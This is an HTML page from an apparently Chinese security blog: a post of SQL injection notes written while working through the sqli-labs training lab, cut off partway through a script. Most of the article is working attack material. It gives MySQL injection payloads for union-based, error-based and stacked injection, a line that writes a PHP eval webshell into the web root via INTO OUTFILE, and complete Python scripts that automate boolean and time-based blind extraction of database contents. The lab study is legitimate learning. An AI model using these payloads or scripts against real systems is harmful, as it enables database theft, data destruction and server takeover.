@@ -1,0 +1,1751 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Sqli笔记, LANVNAL&#39;S Blog">
+    <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Sqli笔记 | LANVNAL&#39;S Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LANVNAL&#39;S Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF/" class="waves-effect waves-light">
+      
+      <i class="fas fa-flag" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/websec/" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web安全</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+      
+      <i class="fas fa-code" style="zoom: 0.6;"></i>
+      
+      <span>代码审计</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+      
+      <i class="fas fa-server" style="zoom: 0.6;"></i>
+      
+      <span>靶机</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/other/" class="waves-effect waves-light">
+      
+      <i class="fas fa-align-left" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>网站导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tags</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>About</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Categories</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Archives</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LANVNAL&#39;S Blog</div>
+        <div class="logo-desc">
+            
+            WEB安全、渗透测试、代码审计、20届毕业本科生
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-flag"></i>
+			
+			CTF
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/websec/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web安全
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-code"></i>
+			
+			代码审计
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-server"></i>
+			
+			靶机
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/other/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-align-left"></i>
+			
+			Others
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			网站导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Tags</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>About</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Categories</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Archives</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/1.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Sqli笔记</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/note/">
+                                <span class="chip bg-color">note</span>
+                            </a>
+                        
+                            <a href="/tags/Sqli/">
+                                <span class="chip bg-color">Sqli</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/websec/" class="post-category">
+                                websec
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-01-10
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-02-18
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    5.3k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>刚刷一遍sqli-labs，而且发现之前刷sqli-labs的笔记找不到了，那就这次顺便做个比较全面的整理，包括基础知识和一些高级技巧，包括mysql、oracle和sqlserver。【oracle和sqlserver更新中】</p>
+</blockquote>
+<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="1、变量和基础信息"><a href="#1、变量和基础信息" class="headerlink" title="1、变量和基础信息"></a>1、变量和基础信息</h4><ul>
+<li><p>当前数据库版本</p>
+<pre><code>VERSION()
+@@VERSION
+@@GLOBAL.VERSION</code></pre>
+</li>
+<li><p>当前用户</p>
+<pre><code>USER()
+SYSTEM_USER()
+SESSION_USER()
+CURRENT_USER()</code></pre>
+</li>
+<li><p>当前数据库</p>
+<pre><code>DATABASE()
+SCHEMA()</code></pre>
+</li>
+<li><p>路径</p>
+<pre><code>@@BASEDIR : mysql安装路径：
+@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：
+@@DATADIR : 数据存储路径：
+@@CHARACTER_SETS_DIR : 字符集设置文件路径
+@@LOG_ERROR : 错误日志文件路径：
+@@PID_FILE : pid-file文件路径
+@@BASEDIR : mysql安装路径：
+@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</code></pre>
+</li>
+</ul>
+<h4 id="2、常用函数"><a href="#2、常用函数" class="headerlink" title="2、常用函数"></a>2、常用函数</h4><h5 id="联合函数"><a href="#联合函数" class="headerlink" title="联合函数"></a>联合函数</h5><pre><code>CONCAT()
+GROUP_CONCAT()
+CONCAT_WS()</code></pre>
+<h5 id="数字-字符-字符串"><a href="#数字-字符-字符串" class="headerlink" title="数字/字符/字符串"></a>数字/字符/字符串</h5><pre><code>ASCII(): 获取字母的ascii码值
+BIN(): 返回值的二进制串表示
+CONV(): 进制转换
+FLOOR()：向下取整
+ROUND()：舍入到最接近的整数
+LOWER()：转成小写字母
+UPPER(): 转成大写字母
+HEX():十六进制编码
+UNHEX()：十六进制解码
+
+MID()：从文本字段中提取字符
+LEFT()：从左侧截取字符串
+SUBSTR()：截取字符串
+SUBSTRING()：截取字符串</code></pre>
+<h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><pre><code>行间注释
+xxx-- -(--后面有个空格)
+xxx;--
+xxx#
+xxx;#
+` (反引号)
+
+行内注释
+/* */
++xx/* 内容 */xx;
+/*! 语句 */
+/*! select * from test */
+语句会被执行</code></pre>
+<h3 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h3><h4 id="1、判断注入存在"><a href="#1、判断注入存在" class="headerlink" title="1、判断注入存在"></a>1、判断注入存在</h4><ul>
+<li><p>数字型</p>
+<pre><code>?id=1+1#
+?id=-1 or 1=1#
+?id=-1 or 10-2=8#
+?id=1 and 1=2#
+?id=1 and 1=1#</code></pre>
+</li>
+<li><p>字符型</p>
+<p>参数被引号或括号包围，我们需要闭合引号或括号。</p>
+<pre><code>?id=1&#39;#
+?id=1&quot;#
+?id=1&#39;)#
+?id=1)#
+?id=1&#39; and &#39;1&#39;=&#39;1#
+?id=1&#39; and &#39;1&#39;=&#39;2#</code></pre>
+</li>
+</ul>
+<h4 id="2、order-by"><a href="#2、order-by" class="headerlink" title="2、order by"></a>2、order by</h4><p>ORDER BY 关键词用于对记录集中的数据进行排序。</p>
+<p>在存在注入的情况下我们可以利用<code>order by</code>子句进行快速猜解列数，再配合<code>union select</code>语句进行回显。</p>
+<pre><code>?id=1&#39; order by 3#(正确)
+?id=1&#39; order by 4#(错误)
+列数为3</code></pre>
+<p>当然通过<code>order by</code>判断出来的列数不一定就是该表中的全部列数，而是该sql语句查询的列个数，如果使用的<code>select * from xx</code>查询的话就可以通过<code>order by</code>得知表的列数。</p>
+<h4 id="3、union查询"><a href="#3、union查询" class="headerlink" title="3、union查询"></a>3、union查询</h4><p>MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。</p>
+<p>通过union操作符我们可以在闭合当前查询语句后拼接一个我们可控的查询语句来查询并带出数据。</p>
+<pre><code class="mysql">mysql&gt; select * from users where id=&#39;1&#39;;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from users where id=&#39;1&#39; union select 1,&#39;aa&#39;,&#39;lanvnal&#39;;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
+|  1 | aa       | lanvnal  |
++----+----------+----------+
+2 rows in set (0.00 sec)</code></pre>
+<p>通常页面只会显示查询的第一个结果，可以通过控制查询条件使原查询的结果为空。</p>
+<h4 id="4、limit用法"><a href="#4、limit用法" class="headerlink" title="4、limit用法"></a>4、limit用法</h4><pre><code>SELECT * FROM ids LIMIT a,b</code></pre>
+<p>LIMIT后的第一个参数是输出记录的初始位置，第二个参数偏移量，偏移多少，输出的条目就是多少。</p>
+<pre><code>SELECT * FROM ids LIMIT 10 OFFSET 2</code></pre>
+<p>OFFSET与逗号隔开基本是一样的，唯一的差别就是两个参数的位置前后颠倒了一下。</p>
+<h4 id="5、查库-表-列名"><a href="#5、查库-表-列名" class="headerlink" title="5、查库/表/列名"></a>5、查库/表/列名</h4><pre><code>查数据库名：select database() 
+查询所有数据库名： select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA
+查询数据库中所有表：select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479
+查users表名下的列名信息：union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x75736572
+查users表名下列名username,password的数据：
+union select 1,username,password from user
+union select 1,group_concat(username,password),3 from users
+
+===============
+information_schema.tables：存储mysql数据库下面的所有表名信息的表
+information_schema.columns ：存储mysql数据库下面的所有列名信息的表
+table_schema：数据库名
+Table_name：表名
+column_name：列名</code></pre>
+<h4 id="6、文件操作"><a href="#6、文件操作" class="headerlink" title="6、文件操作"></a>6、文件操作</h4><blockquote>
+<p>条件：</p>
+<p>需要有读取文件的权限</p>
+<p>需要知道绝对物理路径</p>
+<p>文件大小小于max_allowed_packet</p>
+</blockquote>
+<p>load_file()</p>
+<pre><code>load_file(&quot;/tmp/test.txt”)
+load_file(char(68,58,92,116,101,115,116,46,116,120,116))
+load_file(0x443A2F2F746573742E747874)</code></pre>
+<p>导出数据</p>
+<pre><code>select database() into outfile “/var/www/html/1.txt&quot;
+select &quot;&lt;?php eval($_POST[&#39;LANVNAL&#39;])?&gt;&quot; into outfile &#39;/var/www/html/shell.php&#39;</code></pre>
+<h4 id="7、报错语句"><a href="#7、报错语句" class="headerlink" title="7、报错语句"></a>7、报错语句</h4><pre><code>1、通过UpdateXml报错,注入语句如下:
+uname=1&#39;and 1=(updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where id=4)),1))
+?id=1 and 1=(updatexml(1,(make_set(3,&#39;~&#39;,(database()))),1)) 
+
+2、通过floor报错,注入语句如下:
+uname=1&#39;and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+3、通过ExtractValue报错,注入语句如下:
+uname=1&#39;and extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=database())))
+
+4、通过NAME_CONST报错,注入语句如下:
+name_const(name,value)函数会用传入的参数返回一列结果集.传入的参数必须是常量
+uname=1&#39;and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c)—+
+
+5.通过join报错爆字段
+注：该方法在知道表名的情况下使用
+select * from (select * from 表名 a join 表名 b) c
+在得到一个字段后，使用using得到下一个字段
+select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c  
+
+6.通过exp报错
+uname=1&#39;and exp(~(select * from (select user() ) a) )
+
+7.通过GeometryCollection()报错
+uname=1&#39;and geometrycollection((select * from(select * from(select database())a)b)) --+
+
+8.通过polygon()报错
+uname=1&#39;and polygon((select * from(select * from(select database())a)b)) --+
+
+9.通过multipoint()报错
+uname=1&#39;and multipoint((select * from(select * from(select database())a)b)) --+
+
+10.通过multlinestring()报错
+uname=1&#39;and multilinestring((select * from(select * from(select database())a)b)) --+
+
+11.通过multpolygon()报错
+uname=1&#39;and multipolygon((select * from(select * from(select database())a)b)) —+
+
+12.通过linestring()报错
+uname=1&#39;and linestring((select * from(select * from(select database())a)b))--+</code></pre>
+<h4 id="8、堆叠注入-Stacked-injections"><a href="#8、堆叠注入-Stacked-injections" class="headerlink" title="8、堆叠注入(Stacked injections)"></a>8、堆叠注入(Stacked injections)</h4><p>从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。<br><strong>原理：</strong><br>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：<code> Select * from products where productid=1;DELETE FROM products</code>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。<br><strong>局限性：</strong><br>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<h4 id="9、盲注"><a href="#9、盲注" class="headerlink" title="9、盲注"></a>9、盲注</h4><p>盲注的本质是猜解。</p>
+<p>我们想实现的是我们要构造一条语句来测试我们输入的<strong>布尔表达式</strong>，使得布尔表达式结果的真假直接影响整条语句的执行结果，从而使得系统有不同的反应，在时间盲注中是不同的返回的时间，在布尔盲注中则是不同的页面反应。</p>
+<p>bool盲注脚本：</p>
+<pre><code class="python">#!/usr/bin/python3
+import requests
+import string
+import sys
+global findBit
+import binascii
+
+Flag_yes = &quot;You are in&quot;
+def sendPayload(payload):
+    url = &#39;http://127.0.0.1:8001/Less-5/?id=1&#39;+ payload
+    content = requests.get(url).text
+    return content
+def findDatabaseNumber():
+    count = 1
+    while count:
+        payload = &quot;&#39;AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =&quot;
+        payload = payload + str(count) + &quot;--+&quot;
+        recv = sendPayload(payload)
+        if Flag_yes in recv:
+            return count
+        else:
+            count += 1
+def findTableNumber(dbname):
+    count = 1
+    dbname = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbname)))
+    while count:
+        payload = &quot;&#39;AND (select count(table_name) from information_schema.tables where table_schema=&quot;+dbname+&quot;) =&quot;
+        payload = payload + str(count) + &quot;--+&quot;
+        recv = sendPayload(payload)
+        if Flag_yes in recv:
+            return count
+        else:
+            count += 1
+def findColumnNumber(tableName):
+    count = 1
+    tableName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tableName)))
+    while count:
+        payload = &quot;&#39;AND (select count(column_name) from information_schema.columns where table_name=&quot;+tableName+&quot;) =&quot;
+        payload = payload + str(count) + &quot;--+&quot;
+        recv = sendPayload(payload)
+        if Flag_yes in recv:
+            return count
+        else:
+            count += 1
+def findDataNumber(columnName,tableName):
+    count = 1
+    while count:
+        payload = &quot;&#39;AND (select count(&quot;+columnName+&quot;) from &quot;+tableName+&quot;) =&quot;
+        payload = payload + str(count) + &quot;--+&quot;
+        recv = sendPayload(payload)
+        if Flag_yes in recv:
+            return count
+        else:
+            count += 1
+
+
+def getDatabaseName(dbNum):
+    global findBit
+    for k in range(dbNum):
+        i = 1
+        while i :
+            findBit = 0
+            doubleSearchDbs(-1,255,i,k)
+            i += 1
+            if findBit == 1:
+                sys.stdout.write(&quot;`\r\n&quot;)
+                break
+def getTableName(tableNum,dbName):
+    global findBit
+    dbName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbName)))
+    for k in range(tableNum):
+        i = 1
+        while i :
+            findBit = 0
+            doubleSearchTable(-1,255,i,k,dbName)
+            i += 1
+            if findBit == 1:
+                sys.stdout.write(&quot;\r\n&quot;)
+                break
+def getColumnName(columnNum,tableName):
+    global findBit
+    tableName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tableName)))
+    for k in range(columnNum):
+        i = 1
+        while i :
+            findBit = 0
+            doubleSearchColumn(-1,255,i,k,tableName)
+            i += 1
+            if findBit == 1:
+                sys.stdout.write(&quot;\r\n&quot;)
+                break
+def getDataName(dataNum,columnName,tableName):
+    global findBit
+    for k in range(dataNum):
+        i = 1
+        while i :
+            findBit = 0
+            doubleSearchData(-1,255,i,k,columnName,tableName)
+            i += 1
+            if findBit == 1:
+                sys.stdout.write(&quot;\r\n&quot;)
+                break
+def doubleSearchDbs(leftNum,rightNum,i,k):
+    global findBit
+    midNum = (leftNum + rightNum) / 2
+    if (rightNum != leftNum +1):
+        querysql = &quot;&#39;AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
+        recv = sendPayload(querysql)
+        if Flag_yes in recv:
+            doubleSearchDbs(midNum,rightNum,i,k)
+        else:
+            doubleSearchDbs(leftNum,midNum,i,k)
+    else:
+        if rightNum != 0:
+            sys.stdout.write(chr(int(rightNum)))
+            sys.stdout.flush()
+        else:
+            findBit = 1
+            return
+def doubleSearchTable(leftNum,rightNum,i,k,dbName):
+    global findBit
+    midNum = (leftNum + rightNum) / 2
+    if (rightNum != leftNum +1):
+        querysql = &quot;&#39;AND ASCII(substr((SELECT table_name  FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=&quot;+ dbName+&quot; limit &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
+        recv = sendPayload(querysql)
+        if Flag_yes in recv:
+            doubleSearchTable(midNum,rightNum,i,k,dbName)
+        else:
+            doubleSearchTable(leftNum,midNum,i,k,dbName)
+    else:
+        if rightNum != 0:
+            sys.stdout.write(chr(int(rightNum)))
+            sys.stdout.flush()
+        else:
+            findBit = 1
+            return
+def doubleSearchColumn(leftNum,rightNum,i,k,tableName):
+    global findBit
+    midNum = (leftNum + rightNum) / 2
+    if (rightNum != leftNum +1):
+        querysql = &quot;&#39;AND ascii(substr((SELECT column_name FROM INFORMATION_SCHEMA.columns WHERE TABLE_name=&quot;+ tableName+&quot; limit &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
+        recv = sendPayload(querysql)
+        if Flag_yes in recv:
+            doubleSearchColumn(midNum,rightNum,i,k,tableName)
+        else:
+            doubleSearchColumn(leftNum,midNum,i,k,tableName)
+    else:
+        if rightNum != 0:
+            sys.stdout.write(chr(int(rightNum)))
+            sys.stdout.flush()
+        else:
+            findBit = 1
+            return
+def doubleSearchData(leftNum,rightNum,i,k,columnName,tableName):
+    global findBit
+    midNum = (leftNum + rightNum) / 2
+    if (rightNum != leftNum +1):
+        querysql = &quot;&#39;AND ascii(substr((SELECT &quot;+ columnName+&quot; from &quot; +tableName + &quot; limit &quot; + str(k) + &quot;,1),&quot; + str(i) + &quot;,1)) &gt; &quot; + str(midNum) + &quot;--+&quot;
+        recv = sendPayload(querysql)
+        if Flag_yes in recv:
+            doubleSearchData(midNum,rightNum,i,k,columnName,tableName)
+        else:
+            doubleSearchData(leftNum,midNum,i,k,columnName,tableName)
+    else:
+        if rightNum != 0:
+            sys.stdout.write(chr(int(rightNum)))
+            sys.stdout.flush()
+        else:
+            findBit = 1
+            return
+def exp():
+    dbNum = findDatabaseNumber()
+    print (&quot;the number of database is &quot;+str(dbNum))
+    getDatabaseName(dbNum)
+    dbName = input(&#39;Find tables from :&#39;)
+    tableNum = findTableNumber(dbName)
+    print (&quot;the nameber of table is: &quot; + str(tableNum))
+    getTableName(tableNum,dbName)
+    tableName = input(&#39;Find columns from :&#39;)
+    columnNum = findColumnNumber(tableName)
+    print (&quot;the number of column is: &quot; + str(columnNum))
+    getColumnName(columnNum,tableName)
+    columnName = input(&#39;Find data from :&#39;)
+    dataNum = findDataNumber(columnName,tableName)
+    print (&quot;the number of data is :&quot; + str(dataNum))
+    getDataName(dataNum,columnName,tableName)
+exp()
+</code></pre>
+<p>时间型盲注脚本：</p>
+<pre><code class="python">#!/usr/bin/python3
+import requests
+import string
+import sys
+global findBit
+import binascii
+import time
+
+Flag_yes = &quot;You are in&quot;
+s = r&#39;,0123456789abcdefghijklmnopqrstuvwxyz&#39;
+url = &#39;http://127.0.0.1:8001/Less-9/?id=1\&#39;&#39;
+
+def sendPayload(payload):
+    url = &#39;http://127.0.0.1:8001/Less-9/?id=1\&#39;&#39;+ payload
+    #print (url)
+    content = requests.get(url).text
+    return content
+
+def check(payload):
+    url_new = url + payload
+    time_start = time.time()
+    content = requests.get(url=url_new)
+    time_end = time.time()
+    if time_end - time_start &gt;3:
+        return 1
+
+def getDbNameLength():
+    length = &#39;&#39;
+    for i in range(1,3):
+        for c in range(10):
+            payload = &quot;and if(substr(length(database()),%d,1)=&#39;%d&#39;,sleep(3),1)--+&quot; % (i,c)
+            if check(payload):
+                length += str(c)
+                print (length)
+    sys.stdout.write(&quot;`\r\n&quot;)
+    return int(length)
+
+def getTableLength(dbname):
+    length = &#39;&#39;
+    dbname = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbname)))
+    for i in range(1,3):
+        for c in range(10):
+            payload = &quot;and if(substr(length((select group_concat(table_name) from information_schema.tables where table_schema=&#123;&#125;)),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(dbname,i,c)
+            if check(payload):
+                length += str(c)
+                print (length)
+    sys.stdout.write(&quot;`\r\n&quot;)
+    return int(length)
+
+def getColumnsLength(tbname):
+    length = &#39;&#39;
+    tbname = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tbname)))
+    for i in range(1,3):
+        for c in range(10):
